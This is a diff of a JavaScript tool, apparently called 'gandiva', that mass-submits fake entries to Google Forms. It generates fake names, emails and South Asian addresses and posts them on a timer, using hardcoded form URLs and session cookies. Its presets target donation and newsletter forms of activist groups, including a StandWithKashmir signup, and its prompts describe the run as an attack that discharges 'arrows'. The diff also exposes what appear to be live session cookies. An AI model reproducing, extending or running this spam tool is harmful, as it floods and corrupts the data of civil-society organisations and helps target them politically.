@@ -4,66 +4,58 @@ var __importDefault = (this && this.__importDefault) || function (mod) {
 };
 Object.defineProperty(exports, "__esModule", { value: true });
 // Imports:
-const encodeurl_1 = __importDefault(require("encodeurl"));
-const faker_1 = __importDefault(require("faker"));
+const chalk_1 = __importDefault(require("chalk"));
+const strict_uri_encode_1 = __importDefault(require("strict-uri-encode"));
 const fixed_1 = require("set-interval-async/fixed");
+const faker_1 = __importDefault(require("faker"));
+const random_indian_name_1 = __importDefault(require("random-indian-name"));
+const generateIndianSubcontinentAddress_1 = __importDefault(require("./functions/generateIndianSubcontinentAddress"));
+const usernameGenerator_1 = __importDefault(require("./functions/usernameGenerator"));
+const functions_1 = require("./functions");
 const fs_1 = __importDefault(require("fs"));
 const axios_1 = __importDefault(require("axios"));
 // import tr from 'tor-request'
 // import request from 'request'
-const chalk_1 = __importDefault(require("chalk"));
 const inquirer_1 = __importDefault(require("inquirer"));
+// Constants:
+const presets_1 = __importDefault(require("./presets"));
 // Functions:
-const functions_1 = require("./functions");
-const main = async ({ attackDuration, spamCount, hidden }) => {
+const main = async ({ preset, attackDuration, spamCount, hidden, indian }) => {
     console.log(chalk_1.default.yellow.bold('🏹 gandiva - ') + 'initialising..');
+    const timeID = Date.now();
     const rate = attackDuration ? (attackDuration * 1000 / spamCount) < 5000 ? 5000 : (attackDuration * 1000 / spamCount) : 5000;
     const possibleSpamCount = rate * spamCount > (attackDuration * 1000) ? ((attackDuration * 1000) / rate) : spamCount;
     const identities = [];
-    const options = [
-        [
-            (0, encodeurl_1.default)('Yes').replace(/%20/g, '+'),
-            (0, encodeurl_1.default)('No').replace(/%20/g, '+'),
-            (0, encodeurl_1.default)('I would prefer another messaging platform.').replace(/%20/g, '+')
-        ],
-        [
-            (0, encodeurl_1.default)('$5: Supporter Tier. Minimum donation per magazine for shipping out magazines and the labor put into Censorship.').replace(/%20/g, '+'),
-            (0, encodeurl_1.default)('$6 - $10: Well-Wisher Tier. Donating $6 - $10 per magazine to help us compensate the folks who share their stories, space, and time with us').replace(/%20/g, '+'),
-            (0, encodeurl_1.default)('$10 - $15: Companion Tier. Donating $10 - $15 per magazine in support of our podcast creation, and our live and recorded events.').replace(/%20/g, '+'),
-            (0, encodeurl_1.default)('$16 - $20: Friend Tier. Donating in support of our SWANASA Stories Anthology project and our body of diverse contributors from all around the world!').replace(/%20/g, '+'),
-            (0, encodeurl_1.default)('$21 - $50: Cheerleader Tier. Donating in support of our Black and Dalit centered reparations fund.').replace(/%20/g, '+'),
-            (0, encodeurl_1.default)('$50+ : Co-Conspirator Tier. Donating supporting all the above and more; as a student-run organization, we constantly are supporting efforts to grow and learn. By donating, you are helping support our expanding efforts to expand Other Collective worldwide.').replace(/%20/g, '+')
-        ]
-    ];
+    const optionsSet = presets_1.default[preset].optionsSet;
     let currentSpamCount = 0;
     const timer = (0, fixed_1.setIntervalAsync)(async () => {
         try {
+            const rootName = indian ? (0, random_indian_name_1.default)() : faker_1.default.name.findName();
             const fakeCredentials = {
-                name: (0, encodeurl_1.default)(faker_1.default.name.findName()).replace(/%20/g, '+'),
-                address: (0, encodeurl_1.default)(faker_1.default.address.streetAddress(true) + ', ' +
-                    faker_1.default.address.city() + ['', ' ' + faker_1.default.address.zipCode()][Math.round(Math.random())] + ', ' +
-                    faker_1.default.address.country()).replace(/%20/g, '+'),
-                email: (0, encodeurl_1.default)(faker_1.default.internet.email().split('@')[0] + '@' + ['gmail.com', 'yahoo.com', 'hotmail.com', 'aol.com', 'hotmail.co.uk', 'hotmail.fr', 'msn.com', 'mac.com'][Math.round(Math.random() * 8)])
+                firstName: rootName.split(' ')[0],
+                lastName: rootName.split(' ').splice(1).join(' '),
+                name: (0, strict_uri_encode_1.default)([rootName, rootName.toLowerCase()][Math.floor(Math.random() * 2)]).replace(/%20/g, '+'),
+                address: indian ?
+                    await (0, generateIndianSubcontinentAddress_1.default)(['INDIAN', 'PAKISTANI', 'BANGLADESHI'][Math.floor(Math.random() * 3)])
+                    :
+                        (0, strict_uri_encode_1.default)(faker_1.default.address.streetAddress(true) + ', ' +
+                            faker_1.default.address.city() + ['', ' ' + faker_1.default.address.zipCode()][Math.round(Math.random())] + ', ' +
+                            faker_1.default.address.country()).replace(/%20/g, '+'),
+                email: (0, strict_uri_encode_1.default)((0, usernameGenerator_1.default)(rootName) + '@' + ['gmail.com', 'gmail.com', 'gmail.com', 'yahoo.com', 'yahoo.com', 'hotmail.com', 'hotmail.com', 'aol.com', 'hotmail.co.uk'][Math.floor(Math.random() * 9)])
             };
-            const chosenOption = {
-                canWeEmailYou: options[0][Math.floor(Math.random() * options[0].length)],
-                donate: options[1][Math.floor(Math.random() * options[1].length)]
-            };
-            // NOTE: Edit the values in params:
+            const chosenOption = [];
+            optionsSet.forEach((options, i) => {
+                chosenOption[i] = options[Math.floor(Math.random() * options.length)];
+            });
             const params = {
-                data: `entry.1884265043=${fakeCredentials.name}&entry.1299310772=${fakeCredentials.email}&entry.1195494698=${chosenOption.canWeEmailYou}&entry.99288464=${chosenOption.donate}&entry.513669972=Yes&entry.1195494698_sentinel=&entry.99288464_sentinel=&entry.513669972_sentinel=&fvv=1&partialResponse=%5Bnull%2Cnull%2C%224611978543640427450%22%5D&pageHistory=0&fbzx=4611978543640427450`,
-                URL: 'https://docs.google.com/forms/d/e/1FAIpQLSc3ECWxmrE5utFesuwZKxppt3lSTSLZyocxejlFfnhptR0sNA/formResponse',
-                referrer: 'https://docs.google.com/forms/d/e/1FAIpQLSc3ECWxmrE5utFesuwZKxppt3lSTSLZyocxejlFfnhptR0sNA/viewform?fbzx=4611978543640427450',
-                cookie: 'S=spreadsheet_forms=jYngNZ9zyw0nH_ppyJb8zEW2-zXgIFEHHfs9EDl8LNY; COMPASS=spreadsheet_forms=CjIACWuJVxSvBiJM38n-UjNQKKX2r0zmPXhsd0cICAbBqYG2qJEpjMfTPnQaDRwqV_lVqRC17P-MBho0AAlriVf-eApDl-6hRImox-VT4-9qYzfh57Tgs10m_UKochcwJpBphRu48qydcSPpNox4HQ==; NID=511=FtSHKtmQoZ8mgJQdekzhLA2qPL1H9sfffJ9SoOZCZcdV9-SC2080QafHMcINJG3sSKQ2zk977qfoMUmOqdL9Nf9JoJYpeP7z2kAdW4hr6Wv2wBp09bv4tLGVnNl-DixXPGQmGXIxaobpmvWDiiW_wRG1owqJLiS2XW6BTFsSB9I'
+                data: presets_1.default[preset].params.data(fakeCredentials, chosenOption),
+                URL: presets_1.default[preset].params.URL,
+                referrer: presets_1.default[preset].params.referrer,
+                cookie: presets_1.default[preset].params.cookie
             };
             const header = (0, functions_1.getHeader)(params.referrer, params.cookie);
-            identities.push({
-                name: fakeCredentials.name,
-                email: fakeCredentials.email,
-                canWeEmailYou: chosenOption.canWeEmailYou,
-                donate: chosenOption.donate
-            });
-            fs_1.default.writeFileSync(`./identities-${Date.now()}.json`, JSON.stringify(identities), { encoding: 'utf-8' });
+            identities.push({ fakeCredentials, chosenOption, data: params.data });
+            fs_1.default.writeFileSync(`./identities-${timeID}.json`, JSON.stringify(identities, null, '\t'), { encoding: 'utf-8' });
             if (!hidden) {
                 await axios_1.default.post(params.URL, params.data, { headers: header });
             }
@@ -87,6 +79,30 @@ const main = async ({ attackDuration, spamCount, hidden }) => {
 };
 inquirer_1.default.prompt([
     {
+        name: 'preset',
+        type: 'list',
+        choices: [
+            {
+                name: 'Censorship Orders: Domestic (within the US)',
+                value: 0
+            },
+            {
+                name: 'Censorship Orders: Digital Copy',
+                value: 1
+            },
+            // {
+            //   name: 'Afghanistan Seminar Form',
+            //   value: 2
+            // },
+            {
+                name: 'StandWithKashmir E-Newsletter Subscription',
+                value: 3
+            }
+        ],
+        message: 'which preset would you like to choose?',
+        default: 1
+    },
+    {
         name: 'spamCount',
         type: 'number',
         message: 'how many arrows do you wish to discharge?',
@@ -101,7 +117,14 @@ inquirer_1.default.prompt([
     {
         name: 'hidden',
         type: 'confirm',
-        message: 'do you want to be hidden?',
+        message: 'do you want to be transparent?',
+        default: true,
         filter: () => false
+    },
+    {
+        name: 'indian',
+        type: 'confirm',
+        message: 'do you want to use indian names and addresses?',
+        default: false,
     }
 ]).then(answers => main(answers));
